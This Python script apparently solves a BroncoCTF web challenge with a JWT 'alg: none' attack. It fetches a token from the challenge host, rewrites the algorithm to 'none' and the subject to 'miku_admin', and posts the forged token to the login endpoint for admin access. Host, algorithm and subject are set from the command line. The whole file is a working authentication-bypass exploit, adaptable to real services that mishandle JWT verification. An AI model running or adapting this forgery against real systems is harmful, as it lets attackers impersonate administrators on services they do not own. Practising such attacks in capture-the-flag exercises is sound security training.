#! /usr/bin/env python3
import json
import base64
import requests
import sys

# Default values (Can be overridden via command-line arguments)
HOST = "https://miku.web.broncoctf.xyz/"  # Replace with actual host
MANUAL_TOKEN = None
ALG = "none"
SUB = "miku_admin"

def msg_info(message):
    print(f"[INFO] {message}")

def parse_args():
    """Parses command-line arguments like 'alg=none sub=admin token=...'."""
    global HOST, ALG, SUB, MANUAL_TOKEN

    for arg in sys.argv[1:]:
        if "=" in arg:
            key, value = arg.split("=", 1)
            key, value = key.strip(), value.strip()

            if key == "host":
                HOST = value
            elif key == "alg":
                ALG = value
            elif key == "sub":
                SUB = value
            elif key == "token":
                MANUAL_TOKEN = value  # If token is provided, use it directly

def tweak_token(token: str) -> str:
    try:
        header, payload, signature = token.split(".")
        base64_decoded_header = json.loads(base64.b64decode(header + "==").decode())
        base64_decoded_payload = json.loads(base64.b64decode(payload + "==").decode())

        # Modify the token dynamically
        base64_decoded_header["alg"] = ALG
        base64_decoded_payload["sub"] = SUB

        header = base64.b64encode(json.dumps(base64_decoded_header).encode()).decode().replace("=", "")
        payload = base64.b64encode(json.dumps(base64_decoded_payload).encode()).decode().replace("=", "")
        cookie = f"{header}.{payload}.{signature}"

        msg_info(f"Tweaked Cookie is: {cookie}")
        return cookie
    except Exception as e:
        msg_info(f"Error tweaking token: {e}")
        return None

def get_token():
    if MANUAL_TOKEN:
        msg_info("Using manually provided token.")
        return MANUAL_TOKEN

    try:
        response = requests.get(f"{HOST}/get_token")
        if response.status_code != 200:
            msg_info(f"Failed to get token: {response.text}")
            return None

        token = json.loads(response.text).get("your_token")
        if not token:
            msg_info("No token found in response.")
            return None

        return token
    except Exception as e:
        msg_info(f"Error getting token: {e}")
        return None

def solve():
    parse_args()  # Process command-line arguments

    msg_info(f"Using host: {HOST}")
    msg_info(f"Using alg: {ALG}")
    msg_info(f"Using sub: {SUB}")

    msg_info("Retrieving the token...")
    token = get_token()
    
    if not token:
        msg_info("No valid token retrieved. Exiting.")
        return

    cookie = tweak_token(token)
    if not cookie:
        msg_info("Token tweaking failed. Exiting.")
        return

    data = {"magic_token": cookie}

    try:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        response = requests.post(f"{HOST}/login", data=data, headers=headers)

        msg_info(f"Status Code: {response.status_code}")
        msg_info(f"Response Headers: {response.headers}")
        msg_info(f"Response Body: {response.text}")
    except Exception as e:
        msg_info(f"Error during login: {e}")

if __name__ == "__main__":
    solve()
